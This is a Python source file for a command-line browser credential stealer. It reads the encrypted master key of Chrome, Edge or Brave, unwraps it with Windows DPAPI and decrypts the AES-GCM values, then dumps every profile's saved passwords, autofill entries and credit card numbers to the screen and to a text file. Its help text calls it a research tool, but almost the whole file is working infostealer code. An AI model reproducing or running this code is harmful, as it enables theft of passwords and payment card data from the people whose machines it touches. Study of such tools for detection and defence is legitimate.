import json, base64, os, sqlite3, argparse, shutil
from Crypto.Cipher import AES
import win32crypt
import sys

#  Browser path registry

BROWSER_PATHS = {
    "chrome": {
        "local_state": r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State",
        "user_data":   r"%LOCALAPPDATA%\Google\Chrome\User Data",
    },
    "edge": {
        "local_state": r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State",
        "user_data":   r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
    },
    "brave": {
        "local_state": r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State",
        "user_data":   r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",
    },
}

#  Core decryption logic
class Decryptor:

    def __init__(self, browser: str):
        browser = browser.lower()
        if browser not in BROWSER_PATHS:
            raise ValueError(f"Unsupported browser '{browser}'. Choose from: {', '.join(BROWSER_PATHS)}")
        self.browser = browser
        self.paths = BROWSER_PATHS[browser]
        self._master_key = None  # lazy-loaded lmao

    def get_master_key(self):
        if self._master_key:
            return self._master_key

        local_state_path = os.path.expandvars(self.paths["local_state"])
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # strip "DPAPI" prefix
        self._master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return self._master_key

    def decrypt(self, ciphertext: bytes) -> str:
        try:
            if ciphertext[:3] in (b"v10", b"v11"):
                key = self.get_master_key()
                iv      = ciphertext[3:15]
                payload = ciphertext[15:-16]
                tag     = ciphertext[-16:]
                cipher  = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt_and_verify(payload, tag).decode()
            else:
                # Fallback: DPAPI-only (older entries)
                return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
        except Exception:
            return "<decryption failed>"

#  Grabber (browser-agnostic)

class Grabber:

    def __init__(self, decryptor: Decryptor):
        self.d = decryptor
        self.user_data = os.path.expandvars(decryptor.paths["user_data"])

    def _profile_dirs(self):
        """Yield all valid profile directories inside User Data."""
        for item in os.listdir(self.user_data):
            if item in ("Default",) or item.startswith("Profile"):
                full = os.path.join(self.user_data, item)
                if os.path.isdir(full):
                    yield item, full

    # Passwords

    def dump_passwords(self, output_file="Saved_passwords.txt"):
        print(f"\n{'='*60}")
        print(f"  [{self.d.browser.upper()}] Saved Passwords")
        print(f"{'='*60}\n")

        with open(output_file, "a", encoding="utf-8") as out:
            out.write(f"\n{'='*60}\n[{self.d.browser.upper()}] Saved Passwords\n{'='*60}\n")

            for profile_name, profile_path in self._profile_dirs():
                login_db = os.path.join(profile_path, "Login Data")
                if not os.path.exists(login_db):
                    continue

                print(f"  >> Profile: {profile_name}")
                tmp = login_db + "_tmp.db"
                shutil.copy2(login_db, tmp)

                try:
                    conn   = sqlite3.connect(tmp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                    for url, user, pw_enc in cursor.fetchall():
                        password = self.d.decrypt(pw_enc)
                        line = f"[{url}]  {user} : {password}"
                        print(f"  {line}")
                        out.write(line + "\n")

                    conn.close()
                finally:
                    os.remove(tmp)

        print(f"\n  Saved to {output_file}")

    # Credit Cards 

    def dump_cards(self):
        print(f"\n{'='*60}")
        print(f"  [{self.d.browser.upper()}] Saved Credit Cards")
        print(f"{'='*60}\n")

        default_path = os.path.join(self.user_data, "Default", "Web Data")
        if not os.path.exists(default_path):
            print("  No Web Data found.")
            return

        tmp = default_path + "_tmp.db"
        shutil.copy2(default_path, tmp)

        try:
            conn   = sqlite3.connect(tmp)
            cursor = conn.cursor()

            # Autofill
            cursor.execute("SELECT name, value FROM autofill")
            print("  -- Autofill --")
            for name, value in cursor.fetchall():
                print(f"  {name} : {value}")

            # Credit cards
            cursor.execute(
                "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted "
                "FROM credit_cards"
            )
            print("\n  -- Credit Cards --")
            for name, month, year, cc_enc in cursor.fetchall():
                ccn = self.d.decrypt(cc_enc)
                print(f"  Name: {name}  |  CCN: {ccn}  |  Exp: {month}/{year}")

            conn.close()
        finally:
            os.remove(tmp)

#  CLI entry point

def parse_args():
    parser = argparse.ArgumentParser(
        description="v10/v11 Browser Credential Decryptor — research tool",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "--browser", "-b",
        required=True,
        choices=list(BROWSER_PATHS.keys()),
        metavar="BROWSER",
        help="Target browser: chrome | edge | brave",
    )
    parser.add_argument(
        "--passwords", "-p",
        action="store_true",
        help="Dump saved passwords",
    )
    parser.add_argument(
        "--cards", "-c",
        action="store_true",
        help="Dump saved credit cards / autofill",
    )
    parser.add_argument(
        "--all", "-a",
        action="store_true",
        help="Dump everything (passwords + cards)",
    )
    parser.add_argument(
        "--output", "-o",
        default="Saved_passwords.txt",
        help="Output file for passwords (default: Saved_passwords.txt)",
    )
    return parser.parse_args()


def main():
    args = parse_args()

    # Default: if nothing specified, dump all
    dump_pw    = args.passwords or args.all or (not args.passwords and not args.cards)
    dump_cards = args.cards     or args.all

    try:
        decryptor = Decryptor(args.browser)
        grabber   = Grabber(decryptor)

        if dump_pw:
            grabber.dump_passwords(output_file=args.output)
        if dump_cards:
            grabber.dump_cards()

    except FileNotFoundError:
        print(f"[!] Could not find {args.browser.title()} installation on this machine.")
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    try:
        main()

    except Exception as e:
        print("Error : " + str(e))

    except KeyboardInterrupt:
        print("User Interrupted the Session. . .")

    finally:
        sys.exit()